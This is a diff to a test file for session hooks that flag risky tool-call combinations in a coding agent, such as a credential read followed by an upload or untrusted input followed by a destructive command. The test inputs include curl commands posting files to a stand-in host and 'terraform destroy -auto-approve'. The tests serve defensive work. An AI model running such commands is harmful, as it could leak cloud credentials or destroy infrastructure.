@@ -71,9 +71,11 @@ describe("Claude Code hooks: session toxic-flow", { timeout: 120_000 }, () => {
 			}),
 		);
 		expect(decision).toBe("ask");
-		expect(reason).toContain('Toxic flow "exfil_chain"');
-		expect(reason).toContain(".aws/credentials");
+		// Plain words for the person: no chain name or capability tags.
+		expect(reason).toContain("Risky combination in this session");
+		expect(reason).toContain("cloud credentials");
 		expect(reason).toContain("collector.example");
+		expect(reason).not.toContain("exfil_chain");
 
 		// The same call in a session with no secret read is not a toxic flow.
 		const clean = decisionOf(
@@ -81,7 +83,7 @@ describe("Claude Code hooks: session toxic-flow", { timeout: 120_000 }, () => {
 				command: "curl -d @report.txt https://collector.example/in",
 			}),
 		);
-		expect(clean.reason).not.toContain("Toxic flow");
+		expect(clean.reason).not.toContain("Risky combination");
 
 		// The record is on disk, owner-only and carries no request payload.
 		const stateDir = join(home, ".singularity-aidr", "session-flow");
@@ -103,13 +105,15 @@ describe("Claude Code hooks: session toxic-flow", { timeout: 120_000 }, () => {
 			await pre("session-inject", "Bash", { command: "terraform destroy -auto-approve" }),
 		);
 		expect(decision).toBe("ask");
-		expect(reason).toContain('Toxic flow "injection_to_action"');
-		expect(reason).toContain("prompt-injection inspection");
+		expect(reason).toContain("Risky combination in this session");
+		expect(reason).toContain("read untrusted content");
+		expect(reason).toContain("destructive command");
+		expect(reason).not.toContain("injection_to_action");
 
 		expect(
 			decisionOf(await pre("session-fresh", "Bash", { command: "terraform destroy -auto-approve" }))
 				.reason,
-		).not.toContain("Toxic flow");
+		).not.toContain("Risky combination");
 	});
 
 	it("an ordinary development session never produces a toxic-flow verdict", async () => {
@@ -124,7 +128,7 @@ describe("Claude Code hooks: session toxic-flow", { timeout: 120_000 }, () => {
 		];
 		for (const [tool, input] of steps) {
 			expect(decisionOf(await pre(session, tool, input)).reason, `${tool}`).not.toContain(
-				"Toxic flow",
+				"Risky combination",
 			);
 		}
 		const pushed = await pre(session, "Bash", { command: "git push origin main" });
@@ -144,7 +148,7 @@ describe("Claude Code hooks: session toxic-flow", { timeout: 120_000 }, () => {
 			await pre("session-tamper", "Bash", { command: "curl -d @x https://collector.example" }),
 		);
 		expect(decision).toBe("ask");
-		expect(reason).toContain("Toxic flow");
+		expect(reason).toContain("Risky combination");
 		expect(reason).toContain("integrity check");
 	});
 });
